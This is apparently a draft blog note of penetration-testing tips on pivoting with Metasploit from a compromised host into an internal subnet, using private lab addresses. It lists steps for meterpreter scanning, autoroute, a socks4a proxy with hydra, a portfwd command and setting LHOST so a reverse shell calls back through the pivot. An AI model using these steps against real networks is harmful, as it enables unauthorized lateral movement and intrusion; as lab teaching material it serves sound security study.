---
title: "MSF Pivot Tips"
date: 2019-03-11T21:33:07Z
draft: true
categories: ['notes']
tags: ['tips','pentest']
---

## Network details

Attacker: 192.168.1.2 255.255.255.0 via 192.168.1.1

Easy Target: 192.168.1.3 255.255.255.0 via 192.168.1.1
              192.168.2.5 255.255.255.0 via 192.168.2.1
(No limit on ports for Easy Target. We can do anything with it)

Internal Target: 192.168.2.10 255.255.255.0 via 192.168.2.1
(Only port 80, 445 is allowed in, cannot connect to any ip outside of its class C subnet.)

## Assumptions

We do not know of Internal Target's information.
We will need to set up a way to test for information.

## Goal

We want to gain full control over Internal Target.

## Attack approach

1. Compromise Easy Target and get a meterpreter session, let's call it session 1.
2. Run ipconfig on session 1 to check if it's connected to any other interface.
3. Run arp scanner + arp sweep + tcp scan + udp scan on Easy Target for both `192.168.1.1/24` and `192.168.2.1/24`. This is to ensure that we did not miss out any potential targets that only receive packets from our Easy Target's IP address
4. We should have found our Internal Target 192.168.2.10 with port 80 and 445 open. But we are unable to access it through our attacker machine.

5. Interact with session 1, run autoroute -s 192.168.2.10, background session 1.
5b. We can use /auxiliary/server/socks4a to setup a socks4 proxy and use proxychains with other tools such as hydra out of meterpreter.

6. Now we can send in packets through meterpreter but Internal Target is blocking all egress packets to our subnet. !!!We will think the route failed but that's not the case.

7. From our previous scan through Easy Target, we know port 80, 445 is open on Internal Target. We can set up portfwd in the next step so that we can access the Internal Target using other tools.
8. #meterpreter(session 1)> portfwd add -l <local port> -p <target port> -r <internal target ip>
9. Now we can access internal target port 80 through 127.0.0.1:<local port>

10. After exploring Internal Target we think we find an exploit. We want to get a meterpreter to Internal Host as well. However Internal Host does not allow connection back to our attacker machine.
11. Change payload options. Set LHOST 192.168.1.3 (our easy target). Meterpreter would be smart enough to route the requests back to us.

## Exploited Network

Requests
Attacker -> localhost:port -> Easy Target (portforward request) -> Internal Target

Response
Internal Target -> Easy Target -> Attacker


